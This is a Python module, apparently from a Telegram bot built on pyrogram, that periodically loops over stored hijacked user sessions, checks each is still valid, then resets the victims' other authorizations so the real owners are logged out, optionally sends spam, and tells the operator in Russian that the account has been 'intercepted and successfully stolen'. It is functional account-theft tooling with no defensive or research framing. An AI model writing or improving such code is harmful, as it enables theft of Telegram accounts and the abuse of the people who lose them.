import asyncio
import logging
from pyrogram.raw.functions.auth import ResetAuthorizations
from pyrogram.errors import AuthKeyUnregistered
from tgbot.services.Session import ImportSession

# Configure logging
logger = logging.getLogger(__name__)

async def fetch_users_to_check(data):
    """
    Retrieve users with active sessions that haven't been reset and aren't in the sign-in list.

    Args:
        data: The storage object containing user data.

    Returns:
        list: User data dictionaries meeting the criteria.
    """
    return [
        user_data for user_data in data.storage.values()
        if user_data.get('session') and not user_data.get('reset_auth')
        and user_data.get('phone') not in data._sign_in
    ]

async def process_user_session(user_data, bot, config, data):
    """
    Process a single user's session: validate it and reset authorizations if valid.

    Args:
        user_data: Dict containing user details (e.g., 'user_id', 'phone', 'session').
        bot: The bot instance for sending messages.
        config: Configuration object with settings like admin ID and flags.
        data: Storage object for session management.
    """
    user_id = user_data['user_id']
    phone = user_data['phone']
    admin_id = config.admin

    session_manager = ImportSession().inject(phone)
    async with session_manager.client as client:
        # Validate session
        try:
            await client.get_me()  # Raises exception if session is invalid
        except AuthKeyUnregistered:
            await data.delete_select_session(user_id)
            if config.invalid_session:
                await bot.send_message(admin_id, f'❌ Пользователь <code>{user_id}</> удалил сессию.')
            return
        except Exception as e:
            logger.error(f"Session validation failed for user {user_id}: {e}")
            return

        # Reset authorizations
        try:
            await client.invoke(ResetAuthorizations())
            await data.reset_auth(user_id)
            if config.spam_in_reset_auth:
                await ImportSession(client).spam_reset_auth()
            if config.log.reset_auth:
                await bot.send_message(admin_id, f'✅ <b>Сессия пользователя <code>{user_id}</> перехвачена, аккаунт успешно украден.</>')
        except Exception as e:
            logger.error(f"Authorization reset failed for user {user_id}: {e}")

async def update_sessions(bot):
    """
    Periodically validate and update user sessions in an infinite loop.

    Args:
        bot: Bot instance providing config and data access.

    Notes:
        Runs indefinitely; intended as a background task. Exceptions are logged to prevent silent failures.
    """
    config = bot.config
    data = config.data

    while True:
        await asyncio.sleep(config.check_valid_session)
        try:
            users_to_process = await fetch_users_to_check(data)
            for user_data in users_to_process:
                await process_user_session(user_data, bot, config, data)
        except Exception as e:
            logger.error(f"Session update cycle failed: {e}")